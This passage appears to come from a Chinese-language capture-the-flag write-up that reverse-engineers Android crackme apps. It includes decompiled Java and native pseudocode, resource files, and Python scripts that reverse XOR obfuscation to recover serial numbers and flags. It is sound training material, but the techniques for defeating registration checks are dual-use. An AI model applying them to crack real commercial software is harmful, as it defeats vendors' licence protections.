0xC2, 0x28, 0x7F, 0xED, 0x02, 0x0E, 0x5D, 0x66, 0x8F, 0x98, 0xB5, 0xB7, 0xD0, 0x16, 0x4D, 0x83, 0xF8, 0xFB, 0x01, 0x43, 0x47]key = &#39;Hello Ph0en1x&#39;l1 = len(key)l2 = len(data)for i in range(l2 - 1, 0, -1):    data[i] = (((data[i] + 1 - data[i - 1]) ^ ord(key[i % l1])) &amp; 0xFF) - 1data[0] = (data[0] ^ 0x48) - 1flag = &#39;&#39;.join([chr(c + 1) for c in data])print flag# flag{Ar3_y0u_go1nG_70_scarborough_Fair}</code></pre><h1 id="RememberOther"><a href="#RememberOther" class="headerlink" title="RememberOther"></a>RememberOther</h1><p>这道题简直出的莫名其妙，发现如果用户名和密码都为空会返回 True，并且会弹出 strings.xml 中指向的 successed 字符串：</p><pre><code class="java">package com.droider.crackme0201;import android.app.Activity;import android.os.Bundle;import android.support.v4.view.MotionEventCompat;import android.view.Menu;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class MainActivity extends Activity {    private Button btn_register;    private EditText edit_sn;    private EditText edit_userName;    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        setTitle(R.string.unregister);        this.edit_userName = (EditText) findViewById(R.id.edit_username);        this.edit_sn = (EditText) findViewById(R.id.edit_sn);        this.btn_register = (Button) findViewById(R.id.button_register);        this.btn_register.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                if (MainActivity.this.checkSN(MainActivity.this.edit_userName.getText().toString().trim(), MainActivity.this.edit_sn.getText().toString().trim())) {                    Toast.makeText(MainActivity.this, R.string.successed, 0).show();                    MainActivity.this.btn_register.setEnabled(false);                    MainActivity.this.setTitle(R.string.registered);                    return;                }                Toast.makeText(MainActivity.this, R.string.unsuccessed, 0).show();            }        });    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.activity_main, menu);        return true;    }    private boolean checkSN(String userName, String sn) {        try {            if (userName.length() == 0 &amp;&amp; sn.length() == 0) {                return true;            }            if (userName == null || userName.length() == 0) {                return false;            }            if (sn == null || sn.length() != 16) {                return false;            }            MessageDigest digest = MessageDigest.getInstance(&quot;MD5&quot;);            digest.reset();            digest.update(userName.getBytes());            String hexstr = toHexString(digest.digest(), BuildConfig.FLAVOR);            StringBuilder sb = new StringBuilder();            for (int i = 0; i &lt; hexstr.length(); i += 2) {                sb.append(hexstr.charAt(i));            }            if (sb.toString().equalsIgnoreCase(sn)) {                return true;            }            return false;        } catch (NoSuchAlgorithmException e) {            e.printStackTrace();            return false;        }    }    private static String toHexString(byte[] bytes, String separator) {        StringBuilder hexString = new StringBuilder();        for (byte b : bytes) {            String hex = Integer.toHexString(b &amp; MotionEventCompat.ACTION_MASK);            if (hex.length() == 1) {                hexString.append(&#39;0&#39;);            }            hexString.append(hex).append(separator);        }        return hexString.toString();    }}</code></pre><p>在资源中找到指定的字符串：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;resources&gt;    &lt;string name=&quot;app_name&quot;&gt;Crackme0201&lt;/string&gt;    &lt;string name=&quot;hint_sn&quot;&gt;请输入16位的注册码&lt;/string&gt;    &lt;string name=&quot;hint_username&quot;&gt;请输入用户名&lt;/string&gt;    &lt;string name=&quot;info&quot;&gt;Xman Android&lt;/string&gt;    &lt;string name=&quot;menu_settings&quot;&gt;Settings&lt;/string&gt;    &lt;string name=&quot;register&quot;&gt;注 册&lt;/string&gt;    &lt;string name=&quot;registered&quot;&gt;程序已注册&lt;/string&gt;    &lt;string name=&quot;sn&quot;&gt;注册码：&lt;/string&gt;    &lt;string name=&quot;successed&quot;&gt;md5:b3241668ecbeb19921fdac5ac1aafa69&lt;/string&gt;    &lt;string name=&quot;title_activity_main&quot;&gt;Crackme&lt;/string&gt;    &lt;string name=&quot;unregister&quot;&gt;程序未注册&lt;/string&gt;    &lt;string name=&quot;unsuccessed&quot;&gt;无效用户名或注册码&lt;/string&gt;    &lt;string name=&quot;username&quot;&gt;用户名：&lt;/string&gt;&lt;/resources&gt;</code></pre><p>搜一下 MD5，得到原字符串为 <code>YOU_KNOW_</code>。但结果不对，网上找到别人的 wp，说另一半要结合 word 中的提示，出题人说他不懂安卓，那么我们就懂了，flag 就是 <code>YOU_KNOW_ANDROID</code>。</p><h1 id="黑客精神"><a href="#黑客精神" class="headerlink" title="黑客精神"></a>黑客精神</h1><p>这题相比前面的题目开始复杂起来了。在 MainActivity 中，看到一开始对一个 m 的值进行了判断。然后接下来在 onClick 中新建了一个 MyApp 实例，如果 m 为 0 就调用 doRegister 函数，其中跳转到 RegActivity。</p><pre><code class="java">package com.gdufs.xman;import android.app.Activity;import android.app.AlertDialog.Builder;import android.content.ComponentName;import android.content.DialogInterface;import android.content.Intent;import android.os.Bundle;import android.os.Process;import android.util.Log;import android.view.Menu;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.Toast;public class MainActivity extends Activity {    private static String workString;    private Button btn1;    public void onCreate(Bundle savedInstanceState) {        String str2;        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        String str1 = &quot;Xman&quot;;        Log.d(&quot;com.gdufs.xman m=&quot;, str1);        MyApp myApp = (MyApp) getApplication();        int m = MyApp.m;        if (m == 0) {            str2 = &quot;\u672a\u6ce8\u518c&quot;; // 未注册        } else if (m == 1) {            str2 = &quot;\u5df2\u6ce8\u518c&quot;; // 已注册        } else {            str2 = &quot;\u5df2\u6df7\u4e71&quot;; // 已混乱        }        setTitle(str1 + str2);        this.btn1 = (Button) findViewById(R.id.button1);        this.btn1.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                MyApp myApp = (MyApp) MainActivity.this.getApplication();                if (MyApp.m == 0) {                    MainActivity.this.doRegister();                    return;                }                ((MyApp) MainActivity.this.getApplication()).work();                Toast.makeText(MainActivity.this.getApplicationContext(), MainActivity.workString, 0).show();            }        });    }    public void doRegister() {        new Builder(this).setTitle(&quot;\u6ce8\u518c&quot;).setMessage(&quot;Flag\u5c31\u5728\u524d\u65b9\uff01&quot;).setPositiveButton(&quot;\u6ce8\u518c&quot;, new DialogInterface.OnClickListener() { // Title =&gt; 注册 | Message =&gt; Flag就在前方！ | PositiveButton =&gt; 注册            public void onClick(DialogInterface dialog, int which) {                Intent intent = new Intent();                intent.setComponent(new ComponentName(BuildConfig.APPLICATION_ID, &quot;com.gdufs.xman.RegActivity&quot;));                MainActivity.this.startActivity(intent); // 跳转到RegActivity                MainActivity.this.finish();            }        }).setNegativeButton(&quot;\u4e0d\u73a9\u4e86&quot;, new DialogInterface.OnClickListener() { // NagetiveButton =&gt; 不玩了            public void onClick(DialogInterface dialog, int which) {                Process.killProcess(Process.myPid());            }        }).show();    }    public void work(String str) {        workString = str;    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.menu_main, menu);        return true;    }}</code></pre><p>然后看一下 MyApp 类中，发现分别有三个函数在 Native 层实现。其中 onCreate 中调用了 initSN 函数。SN 猜测是 Serial Number 即序列号：</p><pre><code class="java">package com.gdufs.xman;import android.app.Application;import android.util.Log;public class MyApp extends Application {    public static int m = 0;    public native void initSN();    public native void saveSN(String str);    public native void work();    static {        System.loadLibrary(&quot;myjni&quot;);    }    public void onCreate() {        initSN();        Log.d(&quot;com.gdufs.xman m=&quot;, String.valueOf(m));        super.onCreate();    }}</code></pre><p>RegActivity 中获取输入的字符串，并作为 SN 传入 saveSN 函数。然后 App 将会把自己的进程杀死：</p><pre><code class="java">package com.gdufs.xman;import android.app.Activity;import android.app.AlertDialog.Builder;import android.content.DialogInterface;import android.os.Bundle;import android.os.Process;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class RegActivity extends Activity {    private Button btn_reg;    private EditText edit_sn;    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_reg);        this.btn_reg = (Button) findViewById(R.id.button1);        this.edit_sn = (EditText) findViewById(R.id.editText1);        this.btn_reg.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                String sn = RegActivity.this.edit_sn.getText().toString().trim();                if (sn == null || sn.length() == 0) {                    Toast.makeText(RegActivity.this, &quot;\u60a8\u7684\u8f93\u5165\u4e3a\u7a7a&quot;, 0).show(); // 您的输入为空                    return;                }                ((MyApp) RegActivity.this.getApplication()).saveSN(sn);                new Builder(RegActivity.this).setTitle(&quot;\u56de\u590d&quot;).setMessage(&quot;\u60a8\u7684\u6ce8\u518c\u7801\u5df2\u4fdd\u5b58&quot;).setPositiveButton(&quot;\u597d\u5427&quot;, new DialogInterface.OnClickListener() { // Title =&gt; 回复 | Message =&gt; 您的注册码已保存 | PositiveButton =&gt; 好吧                    public void onClick(DialogInterface dialog, int which) {                        Process.killProcess(Process.myPid());                    }                }).show();            }        });    }}</code></pre><p>那么基本上就是求出正确的 SN 了。在 Native 查看，发现函数在 JNI_OnLoad 中动态注册：</p><pre><code class="cpp">signed int __fastcall JNI_OnLoad(_JavaVM *a1){  if ( a1-&gt;functions-&gt;GetEnv(&amp;a1-&gt;functions, (void **)&amp;g_env, 65542) )    return -1;  _android_log_print(2, &quot;com.gdufs.xman&quot;, &quot;JNI_OnLoad()&quot;);  native_class = (int)g_env-&gt;functions-&gt;FindClass(&amp;g_env-&gt;functions, &quot;com/gdufs/xman/MyApp&quot;);  if ( !g_env-&gt;functions-&gt;RegisterNatives(&amp;g_env-&gt;functions, (jclass)native_class, (const JNINativeMethod *)gMethods, 3) )// register 3 methods  {    _android_log_print(2, &quot;com.gdufs.xman&quot;, &quot;RegisterNatives() --&gt; nativeMethod() ok&quot;);    return 65542;  }  _android_log_print(6, &quot;com.gdufs.xman&quot;, &quot;RegisterNatives() --&gt; nativeMethod() failed&quot;);  return -1;}</code></pre><p>先来看 initSN，其中读取 <code>/sdcard/reg.dat</code> 中的内容并和 <code>EoPAoY62@ElRD</code> 进行比较：</p><pre><code class="cpp">void __fastcall initSN(_JNIEnv *a1){  _JNIEnv *env; // r6  FILE *f; // r0  FILE *f_1; // r4  _JNIEnv *env_1; // r0  int v5; // r1  int len; // r7  char *data; // r5  _JNIEnv *env_2; // r0  int v9; // r1  env = a1;  f = fopen(&quot;/sdcard/reg.dat&quot;, &quot;r+&quot;);  f_1 = f;  if ( !f )                                     // read file error  {    env_1 = env;    v5 = (int)f_1;LABEL_5:    setValue(env_1, v5);    return;  }  fseek(f, 0, 2);                               // seek to file end ( SEEK_END )  len = ftell(f_1);  data = (char *)malloc(len + 1);               // malloc error  if ( !data )  {    fclose(f_1);    env_1 = env;    v5 = 0;    goto LABEL_5;  }  fseek(f_1, 0, 0);                             // seek to file start ( SEEK_SET )  fread(data, len, 1u, f_1);  data[len] = 0;  if ( !strcmp(data, &quot;EoPAoY62@ElRD&quot;) )  {    env_2 = env;    v9 = 1;  }  else  {    env_2 = env;    v9 = 0;  }  setValue(env_2, v9);  j_fclose(f_1);}</code></pre><p>其中看到有一个 setValue 函数，将 m 的值设为指定的值：</p><pre><code class="cpp">void __fastcall setValue(_JNIEnv *a1, int val){  int val_1; // r7  _JNIEnv *v3; // r4  jclass v4; // r0  void *v5; // r5  struct _jfieldID *v6; // r0  val_1 = val;  v3 = a1;  v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;com/gdufs/xman/MyApp&quot;);  v5 = v4;  v6 = v3-&gt;functions-&gt;GetStaticFieldID(&amp;v3-&gt;functions, v4, &quot;m&quot;, &quot;I&quot;);  v3-&gt;functions-&gt;SetStaticIntField(&amp;v3-&gt;functions, v5, v6, val_1);// set m = val}</code></pre><p>接下来看 saveSN，这里做一个循环，将 reg.dat 中的字符串取出来并和 key 进行异或：</p><pre><code class="cpp">int __fastcall saveSN(_JNIEnv *a1, int a2, jstring a3){  _JNIEnv *env; // r6  jstring str; // r9  FILE *v5; // r7  int *v7; // r4  const char *v8; // r3  int v9; // r0  int v10; // r1  _WORD *v11; // r5  JNIEnv *v12; // r0  int i; // r4  const struct JNINativeInterface *v14; // r3  signed int j; // r6  const char *utf_string; // r9  const char *data; // r5  signed int len; // r10  char val; // r2  char tmp; // r3  int v21; // [sp+0h] [bp-38h]  int v22; // [sp+14h] [bp-24h]  char v23; // [sp+18h] [bp-20h]  env = a1;  str = a3;  f = fopen(&quot;/sdcard/reg.dat&quot;, &quot;w+&quot;);  if ( f )  {    v7 = &amp;v21;    v8 = &quot;W3_arE_whO_we_ARE&quot;;    do    {      v9 = *(_DWORD *)v8;      v8 += 8;      v10 = *((_DWORD *)v8 - 1);      *v7 = v9;      v7[1] = v10;      v11 = v7 + 2;      v7 += 2;    }    while ( v8 != &quot;E&quot; );    v12 = &amp;env-&gt;functions;    i = 2016;    *v11 = *(_WORD *)v8;    v14 = env-&gt;functions;    j = 0;    utf_string = v14-&gt;GetStringUTFChars(v12, str, 0);    data = utf_string;    len = strlen(utf_string);    while ( j &lt; len )    {      if ( j % 3 == 1 )      {        i = (i + 5) % 16;        val = *(&amp;v23 + i - 23);                 // &amp;v23 - 32 = &amp;&quot;3_arE_whO_we_ARE&quot;      }      else if ( j % 3 == 2 )      {        i = (i + 7) % 15;        val = *(&amp;v23 + i - 22);                 // &amp;v23 - 22 = &amp;&quot;_arE_whO_we_ARE&quot;      }      else      {        i = (i + 3) % 13;        val = *(&amp;v23 + i - 21);                 // &amp;v23 - 21 = &amp;&quot;arE_whO_we_ARE&quot;      }      tmp = *data;      ++j;      *((_BYTE *)++data - 1) = tmp ^ val;    }    fputs(utf_string, f);  }  else if ( v22 == _stack_chk_guard )  {    return j___android_log_print(3, &quot;com.gdufs.xman&quot;, &amp;unk_2DCA);  }  return j_fclose(f);}</code></pre><p>work 函数中初始化了 SN，获取了 m 的值，并最后调用 callWork：</p><pre><code class="cpp">void __fastcall work(_JNIEnv *a1){  _JNIEnv *env; // r4  jint m; // r0  _JNIEnv *env_1; // r0  void *v4; // r1  bool v5; // zf  env = a1;  initSN(a1);  m = getValue(env);  if ( m )  {    v5 = m == 1;    env_1 = env;    if ( v5 )      v4 = &amp;unk_2E6B;                           // [0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE5, 0x8D, 0xB3, 0xE6, 0x98, 0xAF, 0x66, 0x6C, 0x61, 0x67, 0x2C, 0xE6, 0xA0, 0xBC, 0xE5, 0xBC, 0x8F, 0xE4, 0xB8, 0xBA, 0x78, 0x6D, 0x61, 0x6E, 0x7B, 0xE2, 0x80, 0xA6, 0xE2, 0x80, 0xA6, 0x7D, 0xEF, 0xBC, 0x81]    else      v4 = &amp;unk_2E95;                           // [0xE7, 0x8A, 0xB6, 0xE6, 0x80, 0x81, 0xE4, 0xB8, 0x8D, 0xE5, 0xA4, 0xAA, 0xE5, 0xAF, 0xB9, 0xE3, 0x80, 0x82, 0xE3, 0x80, 0x82]  }  else  {    env_1 = env;    v4 = &amp;unk_2E5B;                             // [0xE8, 0xBF, 0x98, 0xE4, 0xB8, 0x8D, 0xE8, 0xA1, 0x8C, 0xE5, 0x91, 0xA2, 0xEF, 0xBC, 0x81]  }  callWork(env_1, (int)v4);}</code></pre><p>其中 getValue 就是获取 m 的值：</p><pre><code class="cpp">jint __fastcall getValue(_JNIEnv *a1){  _JNIEnv *v1; // r4  jclass v2; // r0  void *v3; // r5  struct _jfieldID *v4; // r0  v1 = a1;  v2 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;com/gdufs/xman/MyApp&quot;);  v3 = v2;  v4 = v1-&gt;functions-&gt;GetStaticFieldID(&amp;v1-&gt;functions, v2, &quot;m&quot;, &quot;I&quot;);  return v1-&gt;functions-&gt;GetStaticIntField(&amp;v1-&gt;functions, v3, v4);// get m&#39;s value}</code></pre><p>callWork 中就是调用了 work 函数，这样看来是个死循环：</p><pre><code class="cpp">void __fastcall callWork(_JNIEnv *a1, void *a2){  const char *v2; // r8  _JNIEnv *env; // r4  jclass v4; // r0  void *v5; // r5  struct _jmethodID *v6; // r0  jobject v7; // r7  struct _jmethodID *v8; // r5  void (*v9)(JNIEnv *, jobject, jmethodID, ...); // r6  jstring v10; // r0  v2 = (const char *)a2;  env = a1;  v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;com/gdufs/xman/MainActivity&quot;);  v5 = v4;  v6 = env-&gt;functions-&gt;GetMethodID(&amp;env-&gt;functions, v4, &quot;&lt;init&gt;&quot;, &quot;()V&quot;);  v7 = env-&gt;functions-&gt;NewObject(&amp;env-&gt;functions, v5, v6);  v8 = env-&gt;functions-&gt;GetMethodID(&amp;env-&gt;functions, v5, &quot;work&quot;, &quot;(Ljava/lang/String;)V&quot;);  if ( v8 )  {    v9 = env-&gt;functions-&gt;CallVoidMethod;    v10 = env-&gt;functions-&gt;NewStringUTF(&amp;env-&gt;functions, v2);    v9(&amp;env-&gt;functions, v7, v8, v10);  }}</code></pre><p>在 saveSN 中其实就是实际的算法，逆一下实现解 SN 脚本：</p><pre><code class="python">#!/usr/bin/env pythonciphertext = &#39;EoPAoY62@ElRD&#39;key = &#39;W3_arE_whO_we_ARE&#39;i = 2016j = 0l = len(ciphertext)result = &#39;&#39;while j &lt; l:    if j % 3 == 1:        i = (i + 5) % 16        val = ord(key[i + 1])    elif j % 3 ==2:        i = (i + 7) % 15        val = ord(key[i + 2])    else:        i = (i + 3) % 13        val = ord(key[i + 3])    result += chr(ord(ciphertext[j]) ^ val)    j += 1print result</code></pre><h1 id="easy-dex"><a href="#easy-dex" class="headerlink" title="easy-dex"></a>easy-dex</h1><p>首先查看 AndroidManifest.xml，发现启动 Activity 为 <code>android.app.NativeActivity</code>，是在 Native 层实现的安卓 Activity：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;manifest android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;com.a.sample.findmydex&quot; platformBuildVersionCode=&quot;24&quot; platformBuildVersionName=&quot;7.0&quot; xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;  &lt;uses-sdk android:minSdkVersion=&quot;19&quot; android:targetSdkVersion=&quot;24&quot; /&gt;  &lt;application android:allowBackup=&quot;false&quot; android:fullBackupContent=&quot;false&quot; android:hasCode=&quot;false&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:theme=&quot;@style/AppTheme&quot;&gt;    &lt;activity android:configChanges=&quot;0xa0&quot; android:label=&quot;@string/app_name&quot; android:name=&quot;android.app.NativeActivity&quot;&gt;      &lt;meta-data android:name=&quot;android.app.lib_name&quot; android:value=&quot;native&quot; /&gt;      &lt;intent-filter&gt;        &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;      &lt;/intent-filter&gt;    &lt;/activity&gt;    &lt;activity android:name=&quot;com.a.sample.findmydex.MainActivity&quot;&gt;      &lt;intent-filter&gt;        &lt;action android:name=&quot;com.a.sample.findmydex.MAIN&quot; /&gt;        &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;      &lt;/intent-filter&gt;    &lt;/activity&gt;  &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>看了一下 Java 只有一个类：</p><pre><code class="java">class Placeholder {    Placeholder() {        super();    }}</code></pre><p>先查看 NativeActivity 中的 onCreate 函数，其中在 pthread_create 里的第三个参数是对应的 MainActivity 的入口点，即 android_app_entry：</p><pre><code class="cpp">int __fastcall ANativeActivity_onCreate(_DWORD *a1, int a2, size_t a3){  _DWORD *v3; // r8  int savedState; // r10  size_t savedStateSize; // r9  int activity; // r0  __int64 v7; // r2  char *v8; // r5  void *v9; // r0  int *v10; // r0  char *v11; // r0  pthread_attr_t attr; // [sp+4h] [bp-30h]  v3 = a1;  savedState = a2;  savedStateSize = a3;  activity = *a1;  *(_DWORD *)(activity + 20) = sub_3000;  *(_DWORD *)activity = sub_305A;  *(_DWORD *)(activity + 4) = sub_3062;  *(_DWORD *)(activity + 8) = sub_306A;  *(_DWORD *)(activity + 12) = sub_30BE;  HIDWORD(v7) = sub_30EE;  *(_DWORD *)(activity + 16) = sub_30C6;  LODWORD(v7) = sub_30DE;  *(_DWORD *)(activity + 56) = sub_30CE;  *(_DWORD *)(activity + 60) = sub_30D6;  *(_QWORD *)(activity + 24) = v7;  *(_DWORD *)(activity + 40) = sub_30F4;  *(_DWORD *)(activity + 44) = sub_30FC;  *(_DWORD *)(activity + 48) = sub_3102;  v8 = (char *)malloc(0x94u);  _aeabi_memclr4();  *((_DWORD *)v8 + 3) = v3;  pthread_mutex_init((pthread_mutex_t *)(v8 + 64), 0);  pthread_cond_init((pthread_cond_t *)(v8 + 68), 0);  if ( savedState )  {    v9 = malloc(savedStateSize);    *((_DWORD *)v8 + 5) = v9;    *((_DWORD *)v8 + 6) = savedStateSize;    _aeabi_memcpy(v9, savedState, savedStateSize);  }  if ( pipe(&amp;attr.__align + 6) )  {    v10 = (int *)_errno();    v11 = strerror(*v10);    _android_log_print(6, &quot;threaded_app&quot;, &quot;could not create pipe: %s&quot;, v11);    v8 = 0;  }  else  {    *((_QWORD *)v8 + 9) = *((_QWORD *)&amp;attr.__align + 3);    pthread_attr_init(&amp;attr);    pthread_attr_setdetachstate(&amp;attr, 1);    pthread_create((pthread_t *)v8 + 20, &amp;attr, (void *(*)(void *))android_app_entry, v8);    pthread_mutex_lock((pthread_mutex_t *)(v8 + 64));    while ( !*((_DWORD *)v8 + 27) )      pthread_cond_wait((pthread_cond_t *)(v8 + 68), (pthread_mutex_t *)(v8 + 64));    pthread_mutex_unlock((pthread_mutex_t *)(v8 + 64));  }  v3[7] = v8;  return _stack_chk_guard - *(&amp;attr.__align + 8);}</code></pre><p>在 android_app_entry 中，在 android_app_destroy 上面可以找到对应的 MainActivity 函数：</p><pre><code class="cpp">int __fastcall android_app_entry(int a1){  int v1; // r4  int v2; // r1  int v3; // r5  int result; // r0  char v5; // [sp+8h] [bp-14h]  char v6; // [sp+Ah] [bp-12h]  int v7; // [sp+Ch] [bp-10h]  v1 = a1;  *(_DWORD *)(a1 + 16) = AConfiguration_new();  v2 = *(_DWORD *)(*(_DWORD *)(v1 + 12) + 32);  AConfiguration_fromAssetManager();  AConfiguration_getLanguage(*(_DWORD *)(v1 + 16), &amp;v6);  AConfiguration_getCountry(*(_DWORD *)(v1 + 16), &amp;v5);  *(_DWORD *)(v1 + 84) = 1;  *(_DWORD *)(v1 + 88) = v1;  *(_DWORD *)(v1 + 92) = sub_3344;  *(_DWORD *)(v1 + 96) = 2;  *(_DWORD *)(v1 + 100) = v1;  *(_DWORD *)(v1 + 104) = sub_3370;  v3 = ALooper_prepare(1);  ALooper_addFd(v3, *(_DWORD *)(v1 + 72), 1, 1, 0, v1 + 84);  *(_DWORD *)(v1 + 28) = v3;  pthread_mutex_lock((pthread_mutex_t *)(v1 + 64));  *(_DWORD *)(v1 + 108) = 1;  pthread_cond_broadcast((pthread_cond_t *)(v1 + 68));  pthread_mutex_unlock((pthread_mutex_t *)(v1 + 64));  j_android_main(v1);  android_app_destroy(v1);  pthread_mutex_lock((pthread_mutex_t *)(v1 + 64));  if ( *(_DWORD *)(v1 + 32) )    AInputQueue_detachLooper();  AConfiguration_delete(*(_DWORD *)(v1 + 16));  *(_DWORD *)(v1 + 116) = 1;  pthread_cond_broadcast((pthread_cond_t *)(v1 + 68));  pthread_mutex_unlock((pthread_mutex_t *)(v1 + 64));  result = _stack_chk_guard - v7;  if ( _stack_chk_guard == v7 )    result = 0;  return result;}</code></pre><p>进入 MainActivity 之后，一开始有一段异或的数据：</p><pre><code class="cpp">  *(_DWORD *)filename = 0x9D888DC6;  *(_DWORD *)&amp;filename[4] = 0x888DC688;  *(_DWORD *)&amp;filename[8] = 0x8AC6889D;  *(_DWORD *)&amp;filename[12] = 0x88C78486;  *(_DWORD *)&amp;filename[16] = 0x84889AC7;  *(_DWORD *)&amp;filename[20] = 0xC78C8599;  *(_DWORD *)&amp;filename[24] = 0x8D87808F;  *(_DWORD *)&amp;filename[28] = 0x8C8D9084;  *(_DWORD *)&amp;filename[32] = 0x808FC691;  *(_DWORD *)&amp;filename[36] = 0xC69A8C85;  *(_DWORD *)&amp;filename[40] = 0x9A88858A;  *(_DWORD *)&amp;filename[44] = 0xC79A8C9A;  *(_DWORD *)&amp;filename[48] = 0xE9918C8D;  filename[52] = 0;  *(_DWORD *)name = 0x9D888DC6;  *(_DWORD *)&amp;name[4] = 0x888DC688;  *(_DWORD *)&amp;name[8] = 0x8AC6889D;  *(_DWORD *)&amp;name[12] = 0x88C78486;  *(_DWORD *)&amp;name[16] = 0x84889AC7;  *(_DWORD *)&amp;name[20] = 0xC78C8599;  *(_DWORD *)&amp;name[24] = 0x8D87808F;  *(_DWORD *)&amp;name[28] = 0x8C8D9084;  *(_DWORD *)&amp;name[32] = 0x808FC691;  *(_DWORD *)&amp;name[36] = 0xC69A8C85;  *(_DWORD *)&amp;name[40] = 0x918C8D86;  name[46] = 0;  i = 1;  *(_WORD *)&amp;name[44] = 0xE9C6u;  filename[0] = 47;  do  {    filename[i] ^= 0xE9u;                       // filename = &#39;/data/data/com.a.sample.findmydex/files/classes.dex&#39;    ++i;  }  while ( i != 53 );  j = 1;  name[0] = 47;  do  {    name[j] ^= 0xE9u;                           // name = &#39;/data/data/com.a.sample.findmydex/files/odex/&#39;    ++j;  }  while ( j != 47 );</code></pre><p>解密一下，可以发现是生成目标 dex 文件和 odex 的路径：</p><pre><code class="python">#!/usr/bin/env pythondef word2bytes(w):    return [w &amp; 0xFF, (w &gt;&gt; 8) &amp; 0xFF, (w &gt;&gt; 16) &amp; 0xFF, w &gt;&gt; 24]def bytes2word(bs):    return bs[0] | bs[1] &lt;&lt; 8 | bs[2] &lt;&lt; 16 | bs[3] &lt;&lt; 24def words2byte(ws):    result = []    for w in ws:        temp = word2bytes(w)        for b in temp:            result.append(b)    return resultdef bytes2words(bs):    result = []    for i in range(len(bs) / 4):        temp = bytes2word(bs[4*i:4*i+4])        result.append(temp)    return resultfilename = [0x9D888DC6, 0x888DC688, 0x8AC6889D, 0x88C78486, 0x84889AC7, 0xC78C8599, 0x8D87808F, 0x8C8D9084, 0x808FC691, 0xC69A8C85, 0x9A88858A, 0xC79A8C9A, 0xE9918C8D]name = [0x9D888DC6, 0x888DC688, 0x8AC6889D, 0x88C78486, 0x84889AC7, 0xC78C8599, 0x8D87808F, 0x8C8D9084, 0x808FC691, 0xC69A8C85, 0x918C8D86, 0x0000E9C6]filename = words2byte(filename)name = words2byte(name)filename = chr(47) + &#39;&#39;.join(list(map(lambda c: chr(c ^ 0xE9), filename[1:])))name = chr(47) + &#39;&#39;.join(list(map(lambda c: chr(c ^ 0xE9), name[1:])))print filename# /data/data/com.a.sample.findmydex/files/classes.dexprint name# /data/data/com.a.sample.findmydex/files/odex/</code></pre><p>然后接下来，可以看到一些涉及到 OpenGL 库的函数：</p><pre><code class="cpp">...  _android_log_print(4, &quot;FindMyDex&quot;, &quot;Can you shake your phone 100 times in 10 seconds?&quot;);  v10 = 0;  do  {    while ( 1 )    {      v12 = 0;      if ( !v30 )        v12 = -1;      v13 = ALooper_pollAll(v12, 0, &amp;v25, &amp;v24);// get time      if ( v13 &gt;= 0 )        break;      if ( v30 )      {        v11 = v31 + 0.01;        if ( (float)(v31 + 0.01) &gt; 1.0 )          v11 = 0.0;        v31 = v11;        sub_2C14((int)&amp;v26);                    // OpenGL      }    }...int __fastcall sub_2C14(int a1){  int v1; // r4  int result; // r0  v1 = a1;  result = *(_DWORD *)(a1 + 20);  if ( !result )    return result;  glClearColor(    (float)*(signed int *)(v1 + 44) / (float)*(signed int *)(v1 + 32),// red    *(GLclampf *)(v1 + 40),                     // green    (float)*(signed int *)(v1 + 48) / (float)*(signed int *)(v1 + 36),// blue    1.0);  glClear(0x4000u);  result = j_eglSwapBuffers(*(_QWORD *)(v1 + 20), *(_QWORD *)(v1 + 20) &gt;&gt; 32);  return result;}</code></pre><p>这部分不去仔细看，可以直接根据 log 来判断程序的流程，可以判断出是要求在 10 秒内摇 100 次手机。在 <code>(times - 1) &lt;= 88</code> 处可以看到开始对数据进行解压缩处理。在后面 <code>times == 100</code>，可以判断是达到了 100 次后，开始对将数据输出到文件中：</p><pre><code class="cpp">...  _android_log_print(4, &quot;FindMyDex&quot;, &quot;Can you shake your phone 100 times in 10 seconds?&quot;);...            _android_log_print(4, &quot;FindMyDex&quot;, &quot;Oh yeah~ You Got it~ %d times to go~&quot;, 99 - v10);...        if ( (unsigned int)(times - 1) &lt;= 88 )        {          v10 = times;          v15 = times / 10;          if ( times % 10 == 9 )          {            v16 = size_1;            v17 = (signed int)size_1 / 10;            v18 = (v15 + 1) * ((signed int)size_1 / 10);            if ( (signed int)size_1 / 10 * v15 &lt; v18 )            {              v19 = &amp;data[v17 * v15];              do              {                --v17;                *v19++ ^= times;              }              while ( v17 );            }            if ( times == 89 )            {              while ( v18 &lt; (signed int)v16 )                data[v18++] ^= 0x59u;            }            v10 = times + 1;          }        }        if ( times == 100 )                     // reach the target        {          if ( (signed int)(time(0) - v6) &gt; 9 )          {            _android_log_print(4, &quot;FindMyDex&quot;, &quot;OH~ You are too slow. Please try again&quot;);            _aeabi_memcpy(data, &amp;data_1, size_1);            v10 = 0;          }          else          {            v20 = v6;            if ( uncompress(dest, &amp;destLen, data, (uLong)size_1) )// uncompress data              _android_log_print(5, &quot;FindMyDex&quot;, &quot;Dangerous operation detected.&quot;);            